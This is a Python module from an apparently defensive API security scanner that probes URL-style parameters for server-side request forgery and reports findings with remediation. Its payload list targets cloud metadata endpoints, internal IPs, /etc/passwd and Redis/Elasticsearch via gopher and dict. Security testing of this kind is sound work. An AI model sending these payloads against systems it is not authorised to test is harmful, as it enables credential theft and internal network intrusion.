"""
API7:2023 — Server-Side Request Forgery (SSRF)
Injects internal IPs and special URLs into URL/webhook/callback parameters.
"""
from __future__ import annotations
import json
import re
import httpx

from modules.base import BaseModule, Endpoint, ScanConfig
from engine.finding import Finding, Severity
from engine.session_manager import SessionContext

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",          # AWS metadata
    "http://169.254.169.254/metadata/v1/",                # Digital Ocean
    "http://metadata.google.internal/",                   # GCP metadata
    "http://127.0.0.1/",                                  # localhost
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",                                      # IPv6 localhost
    "http://192.168.0.1/",                                # Private range
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/",                            # Redis
    "gopher://127.0.0.1:9200/",                          # Elasticsearch
]

URL_PARAM_PATTERNS = re.compile(
    r"(url|webhook|callback|redirect|next|forward|dest|destination|"
    r"target|site|domain|host|endpoint|uri|link|src|source|fetch|load|import)",
    re.IGNORECASE
)


class SsrfModule(BaseModule):
    name = "ssrf"
    title = "Server-Side Request Forgery (SSRF)"
    owasp_category = "API7:2023"
    cwe_ids = ["CWE-918"]
    severity_default = Severity.HIGH
    safe_mode_compatible = True
    destructive = False

    async def run(
        self,
        endpoint: Endpoint,
        session: SessionContext,
        config: ScanConfig,
        client: httpx.AsyncClient,
    ) -> list[Finding]:
        findings: list[Finding] = []
        if not self.is_enabled(config):
            return findings

        # Find URL-like parameters in query params and request body
        url_params = self._find_url_params(endpoint)
        if not url_params:
            return findings

        for param_location, param_name in url_params:
            result = await self._test_ssrf(
                endpoint, session, config, client,
                param_location, param_name
            )
            if result:
                findings.append(result)

        return findings

    def _find_url_params(self, endpoint: Endpoint) -> list[tuple[str, str]]:
        """Find parameters that might accept URLs."""
        found = []
        for param in endpoint.parameters:
            name = param.get("name", "")
            if URL_PARAM_PATTERNS.search(name):
                found.append(("query", name))
        # Also check request body schema field names
        if endpoint.request_body_schema:
            props = endpoint.request_body_schema.get("properties", {})
            for field_name in props:
                if URL_PARAM_PATTERNS.search(field_name):
                    found.append(("body", field_name))
        return found

    async def _test_ssrf(
        self, endpoint: Endpoint, session: SessionContext,
        config: ScanConfig, client: httpx.AsyncClient,
        param_location: str, param_name: str,
    ) -> Finding | None:
        payload = SSRF_PAYLOADS[0]  # AWS metadata as primary probe
        req_kwargs = session.apply({"headers": {}})

        if param_location == "query":
            req_kwargs["params"] = {**req_kwargs.get("params", {}), param_name: payload}
        elif param_location == "body":
            req_kwargs["content"] = json.dumps({param_name: payload}).encode()
            headers = req_kwargs.get("headers", {})
            headers["Content-Type"] = "application/json"
            req_kwargs["headers"] = headers

        try:
            resp = await client.request(
                endpoint.method, endpoint.full_url,
                timeout=config.timeout, **req_kwargs
            )
        except Exception:
            return None

        # Heuristic: if 200 and response body suggests cloud metadata, flag it
        body_lower = resp.text.lower() if resp.text else ""
        ssrf_indicators = [
            "ami-id", "instance-id", "iam/security-credentials",
            "root:x:0:0", "/bin/bash", "metadata",
        ]
        confirmed = any(ind in body_lower for ind in ssrf_indicators)
        suspect = resp.status_code in (200, 201) and len(resp.text) > 10

        if confirmed or suspect:
            severity = Severity.CRITICAL if confirmed else Severity.MEDIUM
            return self._build_finding(
                title=f"Potential SSRF via `{param_name}` Parameter",
                severity=severity,
                cvss_score=9.0 if confirmed else 5.3,
                description=(
                    f"The `{param_name}` parameter in `{endpoint.path}` accepted an internal URL "
                    f"({payload}). "
                    + ("The response contained SSRF confirmation indicators." if confirmed
                       else "The server returned an unexpected success response.")
                ),
                business_impact=(
                    "SSRF allows attackers to make the server issue requests to internal services, "
                    "cloud metadata endpoints, or internal infrastructure, enabling credential theft "
                    "and lateral movement."
                ),
                remediation=(
                    "Validate and allowlist URL parameters against an approved list of external domains. "
                    "Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). "
                    "Use a dedicated HTTP client configured to block internal network access."
                ),
                endpoint_method=endpoint.method,
                endpoint_path=endpoint.path,
                evidence_request=f"{endpoint.method} {endpoint.full_url}\n{param_name}={payload}",
                evidence_response=f"HTTP {resp.status_code}\n{resp.text[:500]}",
                references=[
                    "https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/",
                    "https://cwe.mitre.org/data/definitions/918.html",
                ],
            )
        return None
